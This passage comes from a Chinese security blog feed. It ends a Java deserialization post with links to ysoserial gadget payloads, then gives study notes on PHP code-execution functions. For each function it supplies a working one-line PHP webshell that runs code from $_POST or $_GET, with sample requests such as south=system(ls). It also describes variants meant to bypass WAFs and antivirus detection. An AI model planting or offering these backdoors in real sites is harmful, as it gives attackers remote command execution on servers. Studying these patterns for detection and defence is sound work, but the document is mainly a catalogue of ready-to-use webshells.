href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%876/">反序列化篇
<strong>6</strong></a></p>
<p><a href="https://www.naraku.cn/posts/121.html"><strong>Java</strong>
安全 <strong>-</strong> 反序列化 <strong>-4-CC6</strong></a></p>
<p><a href="https://xz.aliyun.com/t/11562">不删除 <strong>"key"</strong>
的 <strong>CC6</strong> 反序列化</a></p>
<p><strong><a
href="https://github.com/su18/ysoserial/blob/master/src/main/java/org/su18/ysuserial/payloads/CommonsCollections8.java">CommonsCollections8</a></strong></p>
<p><strong><a
href="https://github.com/su18/ysoserial/blob/master/src/main/java/org/su18/ysuserial/payloads/CommonsCollections9.java">CommonsCollections9</a></strong></p>
<p><strong><a
href="https://github.com/su18/ysoserial/blob/master/src/main/java/org/su18/ysuserial/payloads/CommonsCollections10.java">CommonsCollections10</a></strong></p>
<p><a
href="http://wjlshare.com/archives/1536"><strong>CommonsCollections11</strong>
分析</a></p>
<p><a
href="https://xz.aliyun.com/t/8673"><strong>CommonsCollections12</strong>
之 <strong>CommonsCollections6</strong> 改造计划</a></p>
<p><a
href="https://github.com/Y4er/ysoserial/blob/main/src/main/java/ysoserial/payloads/CommonsCollections12.java"><strong>CommonsCollections12</strong></a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Java</tag>
        <tag>Unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全执行函数修炼计划</title>
    <url>/Study-Execution-Function/</url>
    <content><![CDATA[<p>本周任务，学习木马的执行函数。</p>
<p>根据查找到的资料，执行函数分为两类，代码执行函数和命令执行函数。</p>
<span id="more"></span>
<p>短路与<strong>&amp;&amp;</strong>，前者为真，才执行后边；前边为假，都不执行。</p>
<p>逻辑与<strong>&amp;</strong>，无论前边真假，都执行。</p>
<p>短路或<strong>||</strong>，前者为真，后者不执行；前者为假，后者执行。</p>
<p>逻辑或<strong>|</strong>，无论前边真假，都执行。</p>
<h1 id="代码执行">代码执行</h1>
<h2 id="eval">eval</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="keyword">string</span> <span class="variable">$code</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
<p>该函数是将传入的字符串当做<strong>PHP</strong>代码执行，必须以分号结尾，不支持动态调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="string">&quot;echo &#x27;1&#x27;;&quot;</span>);</span><br><span class="line"><span class="comment"># south</span></span><br></pre></td></tr></table></figure>
<p>以上是正常使用，下面是作为一句话木马的使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># /?south=system(ls);</span></span><br></pre></td></tr></table></figure>
<h2 id="assert">assert</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="keyword">mixed</span> <span class="variable">$assertion</span>, <span class="keyword">string</span> <span class="variable">$description</span> = ?): <span class="keyword">bool</span>    <span class="comment"># PHP5</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="keyword">mixed</span> <span class="variable">$assertion</span>, <span class="built_in">Throwable</span> <span class="variable">$exception</span> = ?): <span class="keyword">bool</span>   <span class="comment"># PHP7</span></span><br></pre></td></tr></table></figure>
<p>第一个参数是将传入的字符串当做<strong>PHP</strong>代码执行，是用来判断表达式是否成立的，不需分号结尾，第二个参数可选，作为失败判断的回调信息打印。</p>
<p><strong>assert_option()</strong>可以用来对<strong>assert()</strong>进行一些约束和控制。</p>
<blockquote>
<p><strong>PHP&gt;=5.4.8</strong>时支持<strong>assert</strong>二参数调用，<strong>PHP7</strong>默认不执行代码。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ASSERT_ACTIVE=1 // Assert函数的开关。</span><br><span class="line">ASSERT_WARNING =1 // 当表达式为false时，是否要输出警告性的错误提示。</span><br><span class="line">ASSERT_BAIL= 0 // 是否要中止运行。</span><br><span class="line">ASSERT_QUIET_EVAL= 0 // 在执行表达式时是否关闭错误提示。</span><br><span class="line">ASSERT_CALLBACK= (NULL) // 是否启动回调函数 user function to call on failed assertions</span><br></pre></td></tr></table></figure>
<h3 id="举例">举例</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="string">&#x27;1==1&#x27;</span>);</span><br><span class="line"><span class="comment"># bool(true)</span></span><br></pre></td></tr></table></figure>
<p>以上是正常使用，下面是作为一句话木马的使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=system(ls);	</span></span><br></pre></td></tr></table></figure>
<h3 id="拓展">拓展</h3>
<p>在<strong>PHP7.1</strong>以下，<strong>assert()</strong>函数可以被动态调用，是大多数过狗一句话的原理。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;sea&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
<h2 id="call_user_func">call_user_func</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
<p>第一个参数是回调函数的函数名，后面皆是回调函数的参数。</p>
<p><strong>is_callable()</strong>函数可以检测是否为回调函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;assert&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
<h2 id="call_user_func_array">call_user_func_array</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$args</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
<p>同上，不过第二个参数传入的是数组。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$command</span>[<span class="number">0</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&quot;assert&quot;</span>, <span class="variable">$command</span>);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
<h2 id="create_function">create_function</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>, <span class="keyword">string</span> <span class="variable">$code</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>创建一个匿名函数，第一个参数是匿名函数传入的参数名，第二个参数是匿名函数的代码。</p>
<blockquote>
<p>易被查杀，<strong>PHP7</strong>不可用</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sea</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$command&#x27;</span>, <span class="string">&#x27;eval($command);&#x27;</span>);</span><br><span class="line">    <span class="variable">$sea</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
<h3 id="拓展-1">拓展</h3>
<p>题目如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$south</span> = <span class="string">&#x27;echo s&#x27;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>] . <span class="string">&#x27;;&#x27;</span>;</span><br><span class="line"><span class="variable">$sea</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$south</span>);</span><br><span class="line"><span class="comment"># south=;&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
<p>正常情况下创建的函数如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sea</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;s&#x27;</span> . <span class="variable">$command</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造恶意代码提前闭合函数，构造好的函数如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sea</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;s&#x27;</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
<p>因此得以执行。</p>
<h2 id="preg_replace">preg_replace</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
<p>该函数为在<strong>$subject</strong>参数中匹配<strong>$pattern</strong>参数替换为<strong>$replacement</strong>，而其<strong>$pattern</strong>参数存在的<strong>/e</strong>修饰符会使得<strong>$replacement</strong>参数被当做<strong>PHP</strong>代码解析。</p>
<blockquote>
<p>在<strong>PHP7</strong>中被修正。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/sea/e&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>], <span class="string">&quot;sea&quot;</span>);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
<h2 id="preg_filter">preg_filter</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_filter</span>(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
<p>和<strong>preg_replace</strong>相似，不同之处是返回值。</p>
<blockquote>
<p>三参数调用<strong>preg_replace</strong>需要注意版本号</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">preg_filter</span>(<span class="string">&#x27;|.*|e&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;south&#x27;</span>], <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
<h2 id="preg_replace_callback">preg_replace_callback</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace_callback</span>(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">callable</span> <span class="variable">$callback</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
<p>和<strong>preg_replace</strong>相似，不同之处是可以用回调函数代替<strong>$replacement</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;/.+/i&#x27;</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$arr&#x27;</span>, <span class="string">&#x27;return assert($arr[0]);&#x27;</span>), <span class="variable">$_REQUEST</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
<h2 id="mb_ereg_replace">mb_ereg_replace</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_ereg_replace</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$string</span>,</span><br><span class="line">    ?<span class="keyword">string</span> <span class="variable">$options</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="literal">false</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
<p>和<strong>preg_replace</strong>相似，不同之处是不用分隔符<strong>/</strong>。</p>
<blockquote>
<p>三参数调用<strong>preg_replace</strong>需要注意版本号，<strong>PHP7</strong>被弃用。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">mb_ereg_replace</span>(<span class="string">&#x27;.*&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br><span class="line"><span class="comment"># south=system(ls);</span></span><br></pre></td></tr></table></figure>
<h2 id="mb_ereg_replace_callback">mb_ereg_replace_callback</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_ereg_replace_callback</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">callable</span> <span class="variable">$callback</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$string</span>,</span><br><span class="line">    ?<span class="keyword">string</span> <span class="variable">$options</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="literal">false</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
<p>和<strong>mb_ereg_replace</strong>相似，不同之处是可以用回调函数代替<strong>$replacement</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">mb_ereg_replace_callback</span>(<span class="string">&#x27;.+&#x27;</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$arr&#x27;</span>, <span class="string">&#x27;return assert($arr[0]);&#x27;</span>), <span class="variable">$_REQUEST</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<h2 id="callbackfilteriterator">CallbackFilterIterator</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title class_">CallbackFilterIterator</span>::<span class="title function_ invoke__">__construct</span>(<span class="built_in">Iterator</span> <span class="variable">$iterator</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>PHP&gt;=5.4.0</strong></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$iterator</span> = <span class="keyword">new</span> <span class="built_in">CallbackFilterIterator</span>(<span class="keyword">new</span> <span class="built_in">ArrayIterator</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>],)), <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$sea&#x27;</span>, <span class="string">&#x27;assert($sea);&#x27;</span>));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$iterator</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$item</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="filter_var">filter_var</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$filter</span> = FILTER_DEFAULT, <span class="keyword">array</span>|<span class="keyword">int</span> <span class="variable">$options</span> = <span class="number">0</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>PHP</strong>全版本支持<strong>assert</strong>单参数调用</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">filter_var</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>));</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
<h2 id="filter_var_array">filter_var_array</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var_array</span>(<span class="keyword">array</span> <span class="variable">$data</span>, <span class="keyword">mixed</span> <span class="variable">$definition</span> = ?, <span class="keyword">bool</span> <span class="variable">$add_empty</span> = <span class="literal">true</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>PHP</strong>全版本支持<strong>assert</strong>单参数调用</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">filter_var_array</span>(<span class="keyword">array</span>(<span class="string">&#x27;sea&#x27;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]), <span class="keyword">array</span>(<span class="string">&#x27;sea&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;filter&#x27;</span> =&gt; FILTER_CALLBACK, <span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>)));</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
<h2 id="array_map">array_map</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span>(?<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">array</span> ...<span class="variable">$arrays</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure>
<p>类似于<strong>call_user_func</strong>，但后面传入的<strong>$array1</strong>是多组参数，而返回的是多组参数的执行结果。</p>
<blockquote>
<p>容易被查杀</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">array_map</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=system&amp;sea[0]=ls</span></span><br></pre></td></tr></table></figure>
<h2 id="array_filter">array_filter</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="keyword">array</span> <span class="variable">$array</span>, ?<span class="keyword">callable</span> <span class="variable">$callback</span> = <span class="literal">null</span>, <span class="keyword">int</span> <span class="variable">$mode</span> = <span class="number">0</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure>
<p>同上相似，但是需要注意的是第一个参数是回调函数的参数，第二个参数才是回调函数的函数名，且返回的结果是当回调函数返回<strong>true</strong>时的第一个参数的值的数组。</p>
<blockquote>
<p>容易被查杀</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">array_filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=system&amp;sea[0]=ls</span></span><br></pre></td></tr></table></figure>
<h2 id="array_walk">array_walk</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="keyword">array</span>|<span class="keyword">object</span> &amp;<span class="variable">$array</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$arg</span> = <span class="literal">null</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>三参数调用<strong>preg_replace</strong>需要注意版本号</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sea</span> = <span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,);</span><br><span class="line">    <span class="title function_ invoke__">array_walk</span>(<span class="variable">$sea</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment"># south=preg_replace&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
<h2 id="array_walk_recursive">array_walk_recursive</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_walk_recursive</span>(<span class="keyword">array</span>|<span class="keyword">object</span> &amp;<span class="variable">$array</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$arg</span> = <span class="literal">null</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<p>第二个参数为回调函数名。</p>
<blockquote>
<p>三参数调用<strong>preg_replace</strong>需要注意版本号</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sea</span> = <span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,);</span><br><span class="line">    <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$sea</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment"># south=preg_replace&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
<h2 id="array_reduce">array_reduce</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_reduce</span>(<span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$initial</span> = <span class="literal">null</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
<p>用回调函数迭代地将数组简化为单一的值。</p>
<blockquote>
<p><strong>PHP&gt;=5.4.8</strong>时支持<strong>assert</strong>二参数调用</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">array_reduce</span>(<span class="keyword">array</span>(<span class="number">1</span>), <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
<h2 id="array_udiff">array_udiff</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_udiff</span>(<span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">array</span> ...<span class="variable">$arrays</span>, <span class="keyword">callable</span> <span class="variable">$value_compare_func</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure>
<p>用回调函数比较数据来计算数组的差集。</p>
<blockquote>
<p><strong>PHP&gt;=5.4.8</strong>时支持<strong>assert</strong>二参数调用</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">array_udiff</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>]), <span class="keyword">array</span>(<span class="number">1</span>), <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
<h2 id="register_shutdown_function">register_shutdown_function</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">register_shutdown_function</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$parameter</span> = ?, <span class="keyword">mixed</span> $... = ?): <span class="keyword">void</span></span><br></pre></td></tr></table></figure>
<p>注册一个会在php中止时执行的函数。</p>
<blockquote>
<p><strong>PHP</strong>全版本支持<strong>assert</strong>单参数调用</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">register_shutdown_function</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
<h2 id="register_tick_function">register_tick_function</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">register_tick_function</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<p>注册一个函数以便在每个<strong>tick</strong>上执行。</p>
<blockquote>
<p><strong>PHP</strong>全版本支持<strong>assert</strong>单参数调用</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">register_tick_function</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
<h2 id="usort">usort</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">usort</span>(<span class="keyword">array</span> &amp;<span class="variable">$array</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<p>该函数的原本作用是使用用户自定义的比较函数对数组中的值进行排序，在<strong>PHP5.6</strong>下开始支持变长参数，因此在<strong>Shell</strong>的构造中可以这样。且只有数字索引数组才能作为变长参数数组。</p>
<blockquote>
<p><strong>PHP&gt;=5.4.8</strong>时支持<strong>assert</strong>二参数调用</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);</span><br><span class="line"><span class="comment"># 1[]=1&amp;1[]=ls&amp;2=system</span></span><br></pre></td></tr></table></figure>
<h2 id="uasort">uasort</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">uasort</span>(<span class="keyword">array</span> &amp;<span class="variable">$array</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>PHP&gt;=5.4.8</strong>时支持<strong>assert</strong>二参数调用</p>
</blockquote>
<p>同上，不同之处是不会打乱原数组的顺序。</p>
